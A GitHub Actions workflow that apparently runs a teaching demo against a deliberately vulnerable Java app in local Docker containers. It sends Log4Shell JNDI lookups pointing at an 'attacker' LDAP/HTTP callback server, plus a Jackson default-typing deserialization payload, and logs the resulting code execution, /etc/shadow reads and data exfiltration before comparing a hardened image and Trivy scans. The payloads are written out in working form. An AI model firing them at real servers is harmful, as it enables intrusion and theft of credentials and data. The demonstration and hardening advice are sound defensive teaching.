name: "Vulnerable App — Full Demo"

on:
  push:
    branches: [ master ]
    paths: [ 'Vulnerable Application Old Java/**' ]
  workflow_dispatch:

jobs:
  # ═══════════════════════════════════════════════════════════════
  demo-log4shell:
    name: "💀 Demo 1 — Log4Shell RCE + Data Exfiltration"
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: "Vulnerable Application Old Java"

    steps:
      - uses: actions/checkout@v4

      - name: "🏗️ Build images"
        run: |
          docker build -f Dockerfile.root -t vuln-app:root .
          cd "../Callback Server" && docker build -t callback-server .

      - name: "🚀 Start infrastructure"
        run: |
          docker run -d --name callback -p 9999:9999 -p 1389:1389 callback-server
          docker run -d --name vuln-app \
            --add-host=host.docker.internal:host-gateway \
            -p 8080:8080 vuln-app:root
          for i in $(seq 1 30); do
            curl -s http://localhost:8080/hello > /dev/null 2>&1 && break
            sleep 2
          done

      - name: "📖 Demo 1 — Log4Shell"
        run: |
          S=$GITHUB_STEP_SUMMARY

          cat >> $S << 'HEADER'
          ## 💀 Demo 1 — Log4Shell: From Search Query to Remote Code Execution

          **Scenario:** A developer builds a product search API. They log the search query —
          standard practice. The application uses `log4j-core 2.14.1` (Dec 2021, before the patch).

          ---

          ### 🏢 Victim's server — normal operation

          A legitimate user searches for products:
          ```bash
          # On: Victim's web application (runs as root in Docker)
          curl "http://victim:8080/api/products/search?q=shirt"
          ```
          HEADER

          echo '```json' >> $S
          curl -s "http://localhost:8080/api/products/search?q=shirt" | python3 -m json.tool >> $S
          echo '```' >> $S
          echo "" >> $S
          echo "Everything works normally. The developer's code:" >> $S
          echo '```java' >> $S
          echo 'log.info("Product search query: " + q);  // just logging — what could go wrong?' >> $S
          echo '```' >> $S
          echo "---" >> $S
          echo "" >> $S

          # ── THE ATTACK ──
          cat >> $S << 'ATTACK'
          ### 💀 Attacker's machine — sending the exploit

          The attacker replaces the search term with a JNDI lookup expression:
          ```bash
          # On: Attacker's machine
          curl "http://victim:8080/api/products/search?q=${jndi:ldap://attacker:1389/pwned}"
          ```

          **What happens behind the scenes:**
          1. The search query arrives at the victim's controller
          2. The controller calls `log.info("Product search query: " + q)`
          3. Log4j 2.14.1 sees `${jndi:ldap://...}` and performs a network lookup
          4. The victim connects to the attacker's LDAP server (port 1389)
          5. The LDAP server tells the victim: *"load `ExploitPayload` class from `http://attacker:9999/exploit/`"*
          6. The victim downloads and executes the attacker's malicious Java class
          7. **The attacker now has Remote Code Execution inside the victim's container**

          ATTACK

          echo "The app responds normally — **the victim doesn't notice anything:**" >> $S
          echo '```json' >> $S
          curl -s "http://localhost:8080/api/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fhost.docker.internal%3A1389%2Flog4shell-pwned%7D" >> $S
          echo "" >> $S
          echo '```' >> $S
          sleep 5

          echo "---" >> $S
          echo "" >> $S

          # ── ATTACKER'S VIEW ──
          echo "### 📡 Attacker's server — what the attacker sees" >> $S
          echo "" >> $S
          echo "The attacker's LDAP + HTTP server received connections from the victim:" >> $S
          echo '```' >> $S
          docker logs callback 2>&1 | grep -E "LDAP lookup|Serving malicious|FILE SERVER|Victim|bytes" >> $S
          echo '```' >> $S
          echo "" >> $S

          # ── VICTIM'S CONTAINER ──
          echo "### 🎯 Inside the victim's container — the exploit ran" >> $S
          echo "" >> $S
          echo "The attacker's code executed inside the victim. Here's what it did:" >> $S
          echo '```' >> $S
          docker logs vuln-app 2>&1 | grep -E "REMOTE CODE|Reconnaissance|Running as|User:|Hostname:|OS:|Stealing|shadow|Exfiltrat|Demonstrat|Modified|SSH|read app|outbound|scan internal|──" >> $S
          echo '```' >> $S
          echo "" >> $S

          cat >> $S << 'CONCLUSION'
          ### 💡 Key takeaway

          > **The developer did nothing wrong.** They just logged user input — standard practice.
          > The vulnerability is entirely in the **log4j-core 2.14.1 dependency**.
          > Updating to log4j 2.17+ or removing log4j-core completely prevents this attack.
          CONCLUSION

      - name: "🧹 Cleanup"
        if: always()
        run: docker stop vuln-app callback 2>/dev/null || true; docker rm vuln-app callback 2>/dev/null || true

  # ═══════════════════════════════════════════════════════════════
  demo-jackson:
    name: "💀 Demo 2 — Jackson Deserialization"
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: "Vulnerable Application Old Java"

    steps:
      - uses: actions/checkout@v4

      - name: "🏗️ Build & start"
        run: |
          docker build -f Dockerfile.root -t vuln-app:root .
          cd "../Callback Server" && docker build -t callback-server . && cd -
          docker run -d --name callback -p 9999:9999 -p 1389:1389 callback-server
          docker run -d --name vuln-app --add-host=host.docker.internal:host-gateway -p 8080:8080 vuln-app:root
          for i in $(seq 1 30); do curl -s http://localhost:8080/hello > /dev/null 2>&1 && break; sleep 2; done

      - name: "📖 Demo 2 — Jackson"
        run: |
          S=$GITHUB_STEP_SUMMARY

          cat >> $S << 'HEADER'
          ## 💀 Demo 2 — Jackson Deserialization: Attacker Controls Your Objects

          **Scenario:** A developer builds a "user import" API that accepts JSON.
          The `ObjectMapper` uses `enableDefaultTyping()` — a legacy configuration found in
          many real applications. The application uses `jackson-databind 2.13.4.1`.

          ---

          ### 🏢 Victim's server — normal use

          A legitimate user imports their profile:
          ```bash
          # On: Victim's web application
          curl -X POST http://victim:8080/api/users/import \
            -H "Content-Type: application/json" \
            -d '{"name":"Alice","email":"alice@conf.io"}'
          ```
          HEADER

          echo '```json' >> $S
          curl -s -X POST http://localhost:8080/api/users/import \
            -H "Content-Type: application/json" \
            -d '{"name":"Alice","email":"alice@conf.io"}' | python3 -m json.tool >> $S
          echo '```' >> $S
          echo "" >> $S
          echo "---" >> $S
          echo "" >> $S

          cat >> $S << 'ATTACK'
          ### 💀 Attacker's machine — polymorphic payload

          The attacker sends JSON that tells Jackson **which Java class to instantiate**:
          ```bash
          # On: Attacker's machine
          curl -X POST http://victim:8080/api/users/import \
            -H "Content-Type: application/json" \
            -d '["java.net.URL", "http://attacker:9999/jackson-rce-proof"]'
          ```

          Instead of a user profile, the attacker passes `["java.net.URL", "http://..."]`.
          Jackson's `enableDefaultTyping()` interprets the first element as a Java class name
          and instantiates it with the second element as constructor argument.
          ATTACK

          echo "" >> $S
          echo "Response from the server:" >> $S
          echo '```json' >> $S
          RESP=$(curl -s -X POST http://localhost:8080/api/users/import \
            -H "Content-Type: application/json" \
            -d '["java.net.URL", "http://host.docker.internal:9999/jackson-rce-proof"]')
          echo "$RESP" | python3 -m json.tool 2>/dev/null >> $S || echo "$RESP" >> $S
          echo '```' >> $S
          echo "" >> $S

          cat >> $S << 'CONCLUSION'
          ### 💡 Key takeaway

          > **`parsed_type: URL` proves the attacker controlled which Java class was instantiated.**
          >
          > In this demo we used `java.net.URL` (harmless). In a real attack, the attacker uses
          > gadget classes like `JdbcRowSetImpl` (triggers JNDI → RCE) or `TemplatesImpl`
          > (executes arbitrary bytecode) — same result as Log4Shell.
          >
          > **Fix:** Never use `enableDefaultTyping()`. Use `@JsonTypeInfo` with allow-lists instead.
          > Update jackson-databind to the latest version.
          CONCLUSION

      - name: "🧹 Cleanup"
        if: always()
        run: docker stop vuln-app callback 2>/dev/null; docker rm vuln-app callback 2>/dev/null

  # ═══════════════════════════════════════════════════════════════
  demo-full-chain:
    name: "💀 Demo 3 — Log4Shell → RCE → Root Access"
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: "Vulnerable Application Old Java"

    steps:
      - uses: actions/checkout@v4

      - name: "🏗️ Build all images"
        run: |
          docker build -f Dockerfile.root -t vuln-app:root .
          docker build -f Dockerfile.escalation -t vuln-app:escalation .
          docker build -f Dockerfile.nonroot -t vuln-app:safe .
          cd "../Callback Server" && docker build -t callback-server .

      - name: "🚀 Start attacker + victim (root image)"
        run: |
          docker run -d --name callback -p 9999:9999 -p 1389:1389 callback-server
          docker run -d --name vuln-app \
            --add-host=host.docker.internal:host-gateway \
            -p 8080:8080 vuln-app:root
          for i in $(seq 1 30); do curl -s http://localhost:8080/hello > /dev/null 2>&1 && break; sleep 2; done

      - name: "📖 Demo 3 — Full chain on ROOT image"
        run: |
          S=$GITHUB_STEP_SUMMARY

          cat >> $S << 'HEADER'
          ## 💀 Demo 3 — One HTTP Request → Full Server Compromise

          **Scenario:** Same Log4Shell attack, but now we look at what the attacker
          does AFTER getting code execution. Two images compared:
          - 🔴 **Root image** — runs as root, old OS, has gcc/curl/wget
          - 🟢 **Safe image** — runs as non-root, modern OS, no extra tools

          ---

          ### 🔴 Attack on ROOT image

          The attacker sends the same exploit as Demo 1:
          ```bash
          # On: Attacker's machine
          curl "http://victim:8080/api/products/search?q=${jndi:ldap://attacker:1389/pwned}"
          ```
          HEADER

          # Fire exploit
          curl -s "http://localhost:8080/api/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fhost.docker.internal%3A1389%2Flog4shell-pwned%7D" > /dev/null || true
          sleep 6

          echo "" >> $S
          echo "#### 🎯 What the attacker's code did inside the ROOT container:" >> $S
          echo '```' >> $S
          docker logs vuln-app 2>&1 | grep -E "REMOTE CODE|Reconnaissance|User:|Hostname:|OS:|Stealing|shadow|root:|Exfiltrat|HTTP|Demonstrat|Modified|SSH|create users|pivot|──|\[" | head -30 >> $S
          echo '```' >> $S
          echo "" >> $S

          echo "#### 📡 Attacker's server received the stolen data:" >> $S
          echo '```' >> $S
          docker logs callback 2>&1 | grep -A5 "stolen-data" | head -10 >> $S
          echo '```' >> $S
          echo "" >> $S

          cat >> $S << 'ROOT_IMPACT'
          > **Impact on ROOT image:** The attacker read `/etc/shadow` (password hashes),
          > modified system files, and exfiltrated data. Full server compromise from a single HTTP request.

          ---

          ROOT_IMPACT

      - name: "🔒 Same attack on SAFE image"
        run: |
          S=$GITHUB_STEP_SUMMARY

          docker stop vuln-app 2>/dev/null; docker rm vuln-app 2>/dev/null
          # Clear callback dashboard
          curl -s -X DELETE http://localhost:9999/dashboard > /dev/null || true

          docker run -d --name vuln-app \
            --add-host=host.docker.internal:host-gateway \
            -p 8080:8080 vuln-app:safe
          for i in $(seq 1 30); do curl -s http://localhost:8080/hello > /dev/null 2>&1 && break; sleep 2; done

          echo "### 🟢 Same attack on SAFE image" >> $S
          echo "" >> $S
          echo "Same exploit, same application JAR, but different container configuration:" >> $S
          echo '```bash' >> $S
          echo '# On: Attacker'\''s machine — exact same command' >> $S
          echo 'curl "http://victim:8080/api/products/search?q=${jndi:ldap://attacker:1389/pwned}"' >> $S
          echo '```' >> $S
          echo "" >> $S

          curl -s "http://localhost:8080/api/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fhost.docker.internal%3A1389%2Flog4shell-pwned%7D" > /dev/null || true
          sleep 4

          echo "#### Result on SAFE image:" >> $S
          echo '```' >> $S
          docker logs vuln-app 2>&1 | tail -8 >> $S
          echo '```' >> $S
          echo "" >> $S

          cat >> $S << 'SAFE_RESULT'
          > **The JNDI lookup is blocked.** Java 25 defaults `com.sun.jndi.ldap.object.trustURLCodebase=false`,
          > preventing the JVM from loading remote classes. The attack fails silently.
          >
          > Even if it weren't blocked: no `curl` (can't download exploits), no `gcc` (can't compile),
          > no `pkexec` (can't escalate), non-root user (can't read `/etc/shadow`).

          ---

          ### 💡 Comparison

          | | 🔴 Root image | 🟢 Safe image |
          |---|---|---|
          | **JNDI class loading** | ✅ Succeeds (trustURLCodebase=true) | ❌ Blocked (default) |
          | **Read /etc/shadow** | ✅ Root can read everything | ❌ Permission denied |
          | **Exfiltrate data** | ✅ curl available | ❌ No curl/wget |
          | **Compile exploits** | ✅ gcc installed | ❌ No compiler |
          | **Base image CVEs** | Hundreds (Ubuntu 22.04) | Near zero (modern) |

          > **The same vulnerable JAR runs in both containers.** The difference is entirely
          > in the container configuration. Keep your base images updated and minimal.
          SAFE_RESULT

      - name: "🧹 Cleanup"
        if: always()
        run: docker stop vuln-app callback 2>/dev/null; docker rm vuln-app callback 2>/dev/null

  # ═══════════════════════════════════════════════════════════════
  scan-compare:
    name: "📊 CVE Scan — Image Comparison"
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: "Vulnerable Application Old Java"

    steps:
      - uses: actions/checkout@v4

      - name: "🏗️ Build all images"
        run: |
          docker build -f Dockerfile.root -t vuln-app:root .
          docker build -f Dockerfile.escalation -t vuln-app:escalation .
          docker build -f Dockerfile.nonroot -t vuln-app:safe .

      - name: "🔍 Install Trivy"
        run: curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local/bin

      - name: "📊 Scan & compare"
        run: |
          S=$GITHUB_STEP_SUMMARY

          cat >> $S << 'HEADER'
          ## 📊 Image Security Comparison

          Three Docker images running the **exact same application JAR**, but with
          different base images and configurations:

          HEADER

          declare -A TOTALS CRITS HIGHS SIZES

          for IMG in root escalation safe; do
            JSON=$(trivy image --format json --quiet "vuln-app:$IMG" 2>/dev/null || echo '{"Results":[]}')
            TOTALS[$IMG]=$(echo "$JSON" | python3 -c "import json,sys; d=json.load(sys.stdin); print(sum(len(r.get('Vulnerabilities',[])) for r in d.get('Results',[])))" 2>/dev/null || echo "0")
            CRITS[$IMG]=$(echo "$JSON" | python3 -c "import json,sys; d=json.load(sys.stdin); print(sum(1 for r in d.get('Results',[]) for v in r.get('Vulnerabilities',[]) if v.get('Severity')=='CRITICAL'))" 2>/dev/null || echo "0")
            HIGHS[$IMG]=$(echo "$JSON" | python3 -c "import json,sys; d=json.load(sys.stdin); print(sum(1 for r in d.get('Results',[]) for v in r.get('Vulnerabilities',[]) if v.get('Severity')=='HIGH'))" 2>/dev/null || echo "0")
            SIZES[$IMG]=$(docker image inspect "vuln-app:$IMG" --format='{{.Size}}' | awk '{printf "%.0f", $1/1024/1024}')
          done

          cat >> $S << TABLE
          | Metric | 🔴 root | ⚠️ escalation | 🟢 safe |
          |--------|---------|---------------|---------|
          | Total CVEs | ${TOTALS[root]} | ${TOTALS[escalation]} | ${TOTALS[safe]} |
          | CRITICAL | ${CRITS[root]} | ${CRITS[escalation]} | ${CRITS[safe]} |
          | HIGH | ${HIGHS[root]} | ${HIGHS[escalation]} | ${HIGHS[safe]} |
          | Image Size | ${SIZES[root]} MB | ${SIZES[escalation]} MB | ${SIZES[safe]} MB |
          | User | root | appuser | ubuntu |
          | Has curl/gcc/pkexec | ✅ | ✅ | ❌ |
          | Base image | temurin:11-jre-jammy | temurin:11-jre-jammy | temurin:25-jre |

          TABLE

          echo "### 🔴 Top vulnerabilities — vuln-app:root" >> $S
          echo '```' >> $S
          trivy image --severity CRITICAL,HIGH --no-progress vuln-app:root 2>/dev/null | head -50 >> $S
          echo '```' >> $S
          echo "" >> $S
          echo "### 🟢 Scan — vuln-app:safe" >> $S
          echo '```' >> $S
          trivy image --severity CRITICAL,HIGH --no-progress vuln-app:safe 2>/dev/null | head -50 >> $S
          echo '```' >> $S
